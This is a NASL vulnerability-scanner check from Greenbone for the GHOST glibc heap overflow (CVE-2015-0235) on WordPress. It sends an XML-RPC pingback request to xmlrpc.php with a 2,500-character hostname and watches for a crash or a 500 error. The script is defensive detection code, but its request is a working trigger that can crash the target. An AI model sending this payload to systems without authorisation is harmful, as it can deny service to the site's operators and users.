# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105192");
  script_cve_id("CVE-2015-0235");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("2023-07-25T05:05:58+0000");

  script_name("GNU glibc Remote Heap Buffer Overflow Vulnerability (WordPress)");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/72325");
  script_xref(name:"URL", value:"http://www.gnu.org/software/libc/");

  script_tag(name:"impact", value:"An attacker can exploit this issue to execute arbitrary code in the
context of the affected application. Failed exploit attempts may crash the application, denying service
to legitimate users.");

  script_tag(name:"vuldetect", value:"Send a special crafted XML POST request and check the response");
  script_tag(name:"solution", value:"Update your glibc and reboot.");
  script_tag(name:"summary", value:"The remote host is using a version of glibc which is prone to a heap-based buffer-overflow
vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2015-01-31 15:37:56 +0100 (Sat, 31 Jan 2015)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("host_details.inc");

function _test( boom, port, url, host ) {

  local_var boom, port, url, host;
  local_var soc, xml, len, useragent, req, recv;

  soc = open_sock_tcp( port );
  if( ! soc ) return FALSE;

  xml = '<?xml version="1.0"?>\r\n' +
        ' <methodCall>\r\n' +
        '  <methodName>pingback.ping</methodName>\r\n' +
        '  <params><param><value>\r\n' +
        '    <string>http://' + boom + '/index.php</string>\r\n' +
        '   </value></param>\r\n' +
        '   <param><value>\r\n' +
        '     <string>http://' + boom + '/index.php</string>\r\n' +
        '   </value></param>\r\n' +
        '   </params>\r\n' +
        ' </methodCall>';

  len = strlen( xml );
  useragent = http_get_user_agent();
  req = 'POST ' + url + ' HTTP/1.1\r\n' +
        'Accept: */*\r\n' +
        'User-Agent: ' + useragent + '\r\n' +
        'Host: ' + host + '\r\n' +
        'Content-Length: ' + len + '\r\n' +
        'Content-Type: application/x-www-form-urlencoded\r\n' +
        '\r\n' +
        xml;

  send( socket:soc, data: req );
  recv = recv( socket:soc, length:1024);

  if( ! recv && socket_get_error( soc ) == ECONNRESET ) recv = 'ECONNRESET';

  close( soc );

  return recv;
}

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + "/xmlrpc.php";
host = http_host_name(port:port);

boom = this_host();
buf = _test( boom:boom, port:port, url:url, host:host );

if( "methodResponse" >!< buf ) exit( 0 );

boom = crap( data:"0", length:2500 );
buf = _test( boom:boom, port:port, url:url, host:host );

if( buf == 'ECONNRESET' || "500 Internal Server Error" >< buf )
{
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 0 );
